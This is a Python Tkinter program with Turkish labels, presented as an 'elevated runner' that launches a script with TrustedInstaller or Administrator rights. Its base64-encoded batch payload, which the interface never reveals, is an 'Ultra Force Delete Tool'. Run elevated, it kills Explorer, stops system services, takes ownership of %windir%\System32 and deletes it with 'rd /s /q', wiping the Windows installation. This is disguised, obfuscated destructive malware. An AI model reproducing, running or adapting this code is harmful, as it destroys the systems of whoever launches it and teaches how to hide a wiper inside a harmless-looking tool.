import os
import sys
import ctypes
import subprocess
import tkinter as tk
from tkinter import messagebox
import win32security
import win32api
import win32con
import win32com.shell.shell as shell
import win32serviceutil
import win32service
import time
import tempfile
import base64

ENCODED_BAT = """
QGVjaG8gb2ZmCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24KdGl0bGUgVWx0cmEgRm9yY2UgRGVsZXRlIFRvb2wgLSBUw7xtIERvc3lhbGFyxLEgU2lsCmNvbG9yIDBDCgo6OiBZb25ldGljaSB5ZXRraXNpIGtvbnRyb2x1Cm5ldCBzZXNzaW9uID5udWwgMj4mMQppZiAlZXJyb3JMZXZlbCUgbmVxIDAgKAogICAgZWNobyBbIV0gSEFUQTogQWRtaW5pc3RyYXRvciB5ZXRraXNpIGdlcmVrbGkhCiAgICBlY2hvIFshXSBMdXRmZW4gYnUgZG9zeWF5aSB5b25ldGljaSBvbGFyYWsgY2FsaXN0aXJpbi4KICAgIHBhdXNlCiAgICBleGl0IC9CIDEKKQoKOjogU2lsaW5lY2VrIGtsYXNvciB5b2x1CnNldCAidGFyZ2V0UGF0aD0ld2luZGlyJVxTeXN0ZW0zMiIKCmVjaG8gWytdIFVMVFJBIEZPUkNFIERFTEVURSBUT09MIEJBU0xBVElMSVlPUi4uLgplY2hvIFsrXSBIZWRlZjogJXRhcmdldFBhdGglCmVjaG8uCgo6OiBBY2lrIGRvc3lhbGFyaSBrYXBhdAplY2hvIFsqXSBBY2lrIGRvc3lhbGFyIGtvbnRyb2wgZWRpbGl5b3IuLi4KdGFza2tpbGwgL0YgL0lNIG5vdGVwYWQuZXhlID5udWwgMj4mMQp0YXNra2lsbCAvRiAvSU0gd29yZHBhZC5leGUgPm51bCAyPiYxCnRhc2traWxsIC9GIC9JTSBleHBsb3Jlci5leGUgPm51bCAyPiYxCgo6OiBUdW0gc2VydmlzbGVyaSBkdXJkdXIKZWNobyBbKl0gS3JpdGlrIHNlcnZpc2xlciBkdXJkdXJ1bHV5b3IuLi4KbmV0IHN0b3AgVHJ1c3RlZEluc3RhbGxlciAveSA+bnVsIDI+JjEKbmV0IHN0b3AgV3VhdVNlcnYgL3kgPm51bCAyPiYxCm5ldCBzdG9wIG1zaXNlcnZlciAveSA+bnVsIDI+JjEKbmV0IHN0b3AgV1NlYXJjaCAveSA+bnVsIDI+JjEKCjo6IFNpc3RlbSB5ZXRraWxlcmluaSBrYWxkaXIKZWNobyBbKl0gU2lzdGVtIHlldGtpbGVyaSBrYWxkaXJpbGl5b3IuLi4KaWNhY2xzICIldGFyZ2V0UGF0aCUiIC9zZXRvd25lciAiQWRtaW5pc3RyYXRvcnMiIC9UIC9DID5udWwgMj4mMQppY2FjbHMgIiV0YXJnZXRQYXRoJSIgL3Jlc2V0IC9UID5udWwgMj4mMQoKOjogVHVtIHlldGtpbGVyaSBhbAplY2hvIFsqXSBUdW0geWV0a2lsZXIgYWxpbml5b3IuLi4KdGFrZW93biAvRiAiJXRhcmdldFBhdGglIiAvQSAvUiAvRCBZID5udWwgMj4mMQppY2FjbHMgIiV0YXJnZXRQYXRoJSIgL2dyYW50OnIgQWRtaW5pc3RyYXRvcnM6RiAvVCAvQyAvUSA+bnVsIDI+JjEKaWNhY2xzICIldGFyZ2V0UGF0aCUiIC9ncmFudDpyICV1c2VybmFtZSU6RiAvVCAvQyAvUSA+bnVsIDI+JjEKCjo6IERvc3lhIHNpc3RlbWkga29udHJvbHUKZWNobyBbKl0gRG9zeWEgc2lzdGVtaSBrb250cm9sdSB5YXBpbGl5b3IuLi4KY2hrZHNrIC9GID5udWwgMj4mMQoKOjogVWx0cmEgZm9yY2Ugc2lsbWUKZWNobyBbKl0gVWx0cmEgZm9yY2Ugc2lsbWUgYmFzbGl5b3IuLi4KYXR0cmliIC1yIC1zIC1oICIldGFyZ2V0UGF0aCUiIC9zIC9kID5udWwgMj4mMQpyZCAvcyAvcSAiJXRhcmdldFBhdGglIiA+bnVsIDI+JjEKCjo6IFNvbiBrb250cm9sCmlmIGV4aXN0ICIldGFyZ2V0UGF0aCUiICgKICAgIGVjaG8gWyFdIEhBVEE6IEtsYXNvciBzaWxpbmVtZWRpIQogICAgZWNobyBbIV0gTHV0ZmVuIFdpbmRvd3MgR3V2ZW5saSBNb2RkYSB0ZWtyYXIgZGVuZXlpbi4KKSBlbHNlICgKICAgIGVjaG8gWytdIEJBU0FSSUxJOiBLbGFzb3IgdmUgdHVtIGljZXJpZ2kgc2lsaW5kaSEKKQoKOjogU2VydmlzbGVyaSB5ZW5pZGVuIGJhc2xhdAplY2hvIFsqXSBTZXJ2aXNsZXIgeWVuaWRlbiBiYXNsYXRpbGl5b3IuLi4KbmV0IHN0YXJ0IFRydXN0ZWRJbnN0YWxsZXIgPm51bCAyPiYxCm5ldCBzdGFydCBXdWF1U2VydiA+bnVsIDI+JjEKbmV0IHN0YXJ0IG1zaXNlcnZlciA+bnVsIDI+JjEKbmV0IHN0YXJ0IFdTZWFyY2ggPm51bCAyPiYxCgplY2hvLgplY2hvIFsrXSBJc2xlbSB0YW1hbWxhbmRpIQp0aW1lb3V0IC90IDUKZXhpdCAvQiAw
"""

class ElevatedRunner:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Yüksek Yetkili Çalıştırıcı")
        self.root.geometry("450x350")
        self.root.resizable(False, False)

        # Pencereyi merkeze al
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width - 450) // 2
        y = (screen_height - 350) // 2
        self.root.geometry(f"450x350+{x}+{y}")

        # Stil ayarları
        self.root.configure(bg='#f0f0f0')

        # İkon ayarla (exe içine gömülü)
        try:
            if getattr(sys, 'frozen', False):
                application_path = sys._MEIPASS
            else:
                application_path = os.path.dirname(os.path.abspath(__file__))

            icon_path = os.path.join(application_path, "icon.ico")
            if os.path.exists(icon_path):
                self.root.iconbitmap(icon_path)
        except:
            pass

        # Başlık
        self.title_label = tk.Label(
            self.root,
            text="Yüksek Yetkili Çalıştırıcı",
            font=('Helvetica', 12, 'bold'),
            bg='#f0f0f0'
        )
        self.title_label.pack(pady=20)

        # Yetki seçme
        self.auth_var = tk.StringVar(value="trusted")

        self.auth_frame = tk.Frame(self.root, bg='#f0f0f0')
        self.auth_frame.pack(pady=10)

        self.trusted_radio = tk.Radiobutton(
            self.auth_frame,
            text="TrustedInstaller",
            variable=self.auth_var,
            value="trusted",
            bg='#f0f0f0',
            font=('Helvetica', 10)
        )
        self.trusted_radio.pack(side=tk.LEFT, padx=10)

        self.admin_radio = tk.Radiobutton(
            self.auth_frame,
            text="Administrator",
            variable=self.auth_var,
            value="admin",
            bg='#f0f0f0',
            font=('Helvetica', 10)
        )
        self.admin_radio.pack(side=tk.LEFT, padx=10)

        # Durum mesajı
        self.status_label = tk.Label(
            self.root,
            text="Hazır",
            font=('Helvetica', 9),
            bg='#f0f0f0'
        )
        self.status_label.pack(pady=10)

        # Çalıştır butonu
        self.run_button = tk.Button(
            self.root,
            text="Çalıştır",
            command=self.start_process,
            width=20,
            bg='#4CAF50',
            fg='white',
            font=('Helvetica', 10, 'bold')
        )
        self.run_button.pack(pady=10)

        # Çıkış butonu
        self.exit_button = tk.Button(
            self.root,
            text="Çıkış",
            command=self.root.destroy,
            width=20,
            bg='#f44336',
            fg='white',
            font=('Helvetica', 10, 'bold')
        )
        self.exit_button.pack(pady=10)

    def decode_bat_content(self):
        try:
            # Base64 kodunu çöz
            decoded_bytes = base64.b64decode(ENCODED_BAT.strip())
            return decoded_bytes.decode('utf-8')
        except Exception as e:
            messagebox.showerror("Hata", f"BAT içeriği çözülemedi: {str(e)}")
            return None

    def create_temp_bat(self):
        try:
            # BAT içeriğini çöz
            bat_content = self.decode_bat_content()
            if not bat_content:
                return None

            # Geçici klasörde benzersiz bir dosya oluştur
            temp_dir = tempfile.gettempdir()
            temp_bat = os.path.join(temp_dir, f'script_{os.getpid()}.bat')

            # Bat dosyasını oluştur
            with open(temp_bat, 'w', encoding='utf-8') as f:
                f.write(bat_content)

            return temp_bat
        except Exception as e:
            messagebox.showerror("Hata", f"Geçici BAT dosyası oluşturulamadı: {str(e)}")
            return None

    def cleanup_temp_bat(self, bat_path):
        try:
            if os.path.exists(bat_path):
                os.remove(bat_path)
        except:
            pass

    def start_trustedinstaller_service(self):
        try:
            win32serviceutil.StartService("TrustedInstaller")
            time.sleep(2)
            return True
        except Exception as e:
            messagebox.showerror("Hata", f"TrustedInstaller servisi başlatılamadı: {str(e)}")
            return False

    def run_as_trustedinstaller(self, bat_path):
        try:
            if not self.start_trustedinstaller_service():
                return False

            shell.ShellExecuteEx(
                lpVerb='runas',
                lpFile='cmd.exe',
                lpParameters=f'/c "{bat_path}"'
            )
            return True

        except Exception as e:
            messagebox.showerror("Hata", f"TrustedInstaller yetkisiyle çalıştırma hatası: {str(e)}")
            return False

    def run_as_admin(self, bat_path):
        try:
            shell.ShellExecuteEx(
                lpVerb='runas',
                lpFile='cmd.exe',
                lpParameters=f'/c "{bat_path}"'
            )
            return True
        except Exception as e:
            messagebox.showerror("Hata", f"Admin yetkisiyle çalıştırma hatası: {str(e)}")
            return False

    def start_process(self):
        self.run_button.config(state='disabled')

        # Geçici bat dosyası oluştur
        temp_bat = self.create_temp_bat()
        if not temp_bat:
            self.run_button.config(state='normal')
            return

        auth_type = self.auth_var.get()
        success = False

        try:
            if auth_type == "trusted":
                self.status_label.config(text="TrustedInstaller yetkisiyle çalıştırılıyor...")
                success = self.run_as_trustedinstaller(temp_bat)
                if not success:
                    self.status_label.config(text="Admin yetkisiyle deneniyor...")
                    success = self.run_as_admin(temp_bat)
            else:
                self.status_label.config(text="Admin yetkisiyle çalıştırılıyor...")
                success = self.run_as_admin(temp_bat)

        finally:
            # İşlem bitince geçici dosyayı temizle
            self.cleanup_temp_bat(temp_bat)

        if success:
            self.status_label.config(text="Başarıyla çalıştırıldı")
            time.sleep(1)
            self.root.destroy()
        else:
            self.status_label.config(text="Hazır")
            self.run_button.config(state='normal')

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = ElevatedRunner()
    app.run()
